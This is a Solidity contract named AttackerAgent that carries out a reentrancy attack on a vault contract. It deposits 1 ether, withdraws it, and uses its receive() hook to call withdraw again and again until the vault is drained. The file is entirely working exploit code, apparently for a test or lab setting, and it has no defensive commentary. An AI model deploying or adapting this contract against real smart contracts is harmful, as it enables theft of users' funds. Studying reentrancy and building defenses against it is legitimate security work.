// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

interface IDefenseVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract AttackerAgent {
    IDefenseVault public target;

    constructor(address _target) {
        target = IDefenseVault(_target);
    }

    // Start exploit
    function attack() external payable {
        require(msg.value >= 1 ether, "Need funds");
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
    }

    // Reentrancy hook
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }
}
